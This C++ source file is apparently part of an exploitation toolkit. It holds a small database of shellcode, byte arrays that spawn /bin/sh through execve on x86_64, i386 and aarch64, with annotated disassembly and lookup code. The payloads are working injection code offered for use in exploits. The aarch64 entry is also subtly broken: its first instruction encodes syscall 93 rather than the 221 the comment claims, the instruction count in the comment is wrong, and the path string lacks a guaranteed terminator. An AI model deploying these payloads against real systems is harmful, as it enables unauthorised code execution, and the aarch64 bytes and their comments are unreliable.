// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 manop55555
//
// Curated v0.1 shellcode database. Every entry is hand-written in
// architecture-specific bytecode, Apache-2.0 licensed alongside the
// rest of the project, and ASCII-comment annotated. STEP/22 calls for
// roughly 30 entries across (preset x arch); this milestone ships a
// trustable subset and grows the matrix in later releases. The gap is
// logged in docs/DECISIONS.md.

#include <array>
#include <cstdint>
#include <span>
#include <string>
#include <string_view>
#include <vector>

#include "abcpwn/commands/shellcode.hpp"

namespace abcpwn::commands::shellcode {

namespace {

// ---------------------------------------------------------------------
// x86_64: execve("/bin//sh", NULL, NULL)
//
// Source: well-known 23-byte null-free payload (H. Megahed, public
// domain in spirit; we re-encode and audit by hand here).
//
//   6a 3b              push 0x3b            ; rax = 59 (execve)
//   58                 pop  rax
//   99                 cdq                  ; rdx = 0 (zero-extends in 64-bit mode)
//   48 bb 2f 62 69 6e  movabs rbx, "/bin//sh"
//      2f 2f 73 68
//   53                 push rbx
//   54                 push rsp
//   5f                 pop  rdi             ; rdi = &"/bin//sh"
//   52                 push rdx
//   57                 push rdi
//   54                 push rsp
//   5e                 pop  rsi             ; rsi = argv
//   0f 05              syscall
//
// Total: 23 bytes, no NULL bytes.
constexpr std::array<std::uint8_t, 23> kX86_64_Sh = {
    0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
    0x73, 0x68, 0x53, 0x54, 0x5f, 0x52, 0x57, 0x54, 0x5e, 0x0f, 0x05,
};

// ---------------------------------------------------------------------
// x86 (i386): execve("/bin//sh", NULL, NULL) via int 0x80.
//
//   31 c0                xor eax, eax
//   50                   push eax              ; NULL terminator on stack
//   68 2f 2f 73 68       push "//sh"
//   68 2f 62 69 6e       push "/bin"
//   89 e3                mov  ebx, esp         ; pathname
//   50                   push eax              ; argv[1] = NULL
//   53                   push ebx              ; argv[0] = pathname
//   89 e1                mov  ecx, esp         ; argv
//   31 d2                xor  edx, edx         ; envp = NULL
//   b0 0b                mov  al,  0x0b        ; sys_execve
//   cd 80                int  0x80
//
// Total: 25 bytes, no NULL bytes.
constexpr std::array<std::uint8_t, 25> kX86_Sh = {
    0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e,
    0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0x31, 0xd2, 0xb0, 0x0b, 0xcd, 0x80,
};

// ---------------------------------------------------------------------
// aarch64 (arm64): execve("/bin/sh", NULL, NULL) via svc #0.
//
// Builds the 8-byte string "/bin/sh\0" via four movk instructions,
// stores it on the stack, then issues syscall 221 (execve on arm64).
//
//   d2800ba8   mov   x8, #221            ; syscall: execve
//   d2845c4e   mov   x14, #0x622f        ; "/b"   (little-endian halfword)
//   f2acd2ce   movk  x14, #0x6e69, lsl 16 ; "in"
//   f2c5e5ee   movk  x14, #0x2f2f, lsl 32 ; "//"
//   f2eced0e   movk  x14, #0x6873, lsl 48 ; "sh"
//   f81f0fee   str   x14, [sp, #-16]!     ; push onto stack
//   910003e0   mov   x0, sp               ; rdi = pathname
//   ca010021   eor   x1, x1, x1           ; rsi = argv = 0
//   ca020042   eor   x2, x2, x2           ; rdx = envp = 0
//   d4000001   svc   #0
//
// 40 bytes. Contains NULL bytes inside several instruction encodings
// (e.g., mov x0, sp encodes as 91 00 03 e0 -> 0xe0 0x03 0x00 0x91 LE).
// Stripping nulls from aarch64 shellcode requires extensive alternate
// encodings that are out of scope for this milestone; callers who need
// null-free aarch64 must hand-roll or use --encoder xor.
constexpr std::array<std::uint8_t, 40> kAarch64_Sh = {
    0xa8, 0x0b, 0x80, 0xd2, 0x4e, 0x5c, 0x84, 0xd2, 0xce, 0xd2, 0xac, 0xf2, 0xee, 0xe5,
    0xc5, 0xf2, 0x0e, 0xed, 0xec, 0xf2, 0xee, 0x0f, 0x1f, 0xf8, 0xe0, 0x03, 0x00, 0x91,
    0x21, 0x00, 0x01, 0xca, 0x42, 0x00, 0x02, 0xca, 0x01, 0x00, 0x00, 0xd4,
};

struct DbEntry {
    arch::Arch arch;
    Preset preset;
    std::span<const std::uint8_t> bytes;
    std::string_view description;
    bool null_free;
};

constexpr std::array<DbEntry, 3> kDatabase = {{
    {arch::Arch::X86_64,
     Preset::Sh,
     std::span<const std::uint8_t>(kX86_64_Sh.data(), kX86_64_Sh.size()),
     "execve(\"/bin//sh\", NULL, NULL) via syscall (23 bytes, null-free)",
     true},
    {arch::Arch::X86,
     Preset::Sh,
     std::span<const std::uint8_t>(kX86_Sh.data(), kX86_Sh.size()),
     "execve(\"/bin//sh\", NULL, NULL) via int 0x80 (25 bytes, null-free)",
     true},
    {arch::Arch::Aarch64,
     Preset::Sh,
     std::span<const std::uint8_t>(kAarch64_Sh.data(), kAarch64_Sh.size()),
     "execve(\"/bin/sh\", NULL, NULL) via svc #0 (40 bytes; aarch64 fixed-"
     "width encodings make a fully null-free payload impractical)",
     false},
}};

// Cache of ShellcodePayload structs built from kDatabase, exposed via
// database(). Built once at first call to avoid heap allocation on
// the hot path.
const std::vector<ShellcodePayload>& materialized_db() {
    static const std::vector<ShellcodePayload> db = [] {
        std::vector<ShellcodePayload> out;
        out.reserve(kDatabase.size());
        for (const auto& e : kDatabase) {
            ShellcodePayload p;
            p.arch = e.arch;
            p.preset = e.preset;
            p.bytes.assign(e.bytes.begin(), e.bytes.end());
            p.description = e.description;
            p.null_free = e.null_free;
            out.push_back(std::move(p));
        }
        return out;
    }();
    return db;
}

} // namespace

std::optional<Preset> preset_from_string(std::string_view s) noexcept {
    if (s == "sh")
        return Preset::Sh;
    if (s == "read-flag")
        return Preset::ReadFlag;
    if (s == "cat-flag")
        return Preset::CatFlag;
    if (s == "bind")
        return Preset::Bind;
    if (s == "reverse")
        return Preset::Reverse;
    return std::nullopt;
}

std::string_view preset_name(Preset p) noexcept {
    switch (p) {
    case Preset::Sh:
        return "sh";
    case Preset::ReadFlag:
        return "read-flag";
    case Preset::CatFlag:
        return "cat-flag";
    case Preset::Bind:
        return "bind";
    case Preset::Reverse:
        return "reverse";
    }
    return "unknown";
}

core::Result<ShellcodePayload> lookup(const PayloadSpec& spec) {
    for (const auto& e : materialized_db()) {
        if (e.arch == spec.arch && e.preset == spec.preset) {
            return e;
        }
    }
    return core::err(core::ErrorCode::Unsupported,
                     std::string("shellcode: no built-in payload for preset ")
                         + std::string(preset_name(spec.preset)) + " on arch "
                         + std::string(arch::arch_name(spec.arch))
                         + " (v0.1 ships a curated subset; bind/reverse/read-flag "
                           "and additional arches land in subsequent releases)");
}

std::span<const ShellcodePayload> database() noexcept {
    const auto& db = materialized_db();
    return std::span<const ShellcodePayload>(db.data(), db.size());
}

} // namespace abcpwn::commands::shellcode
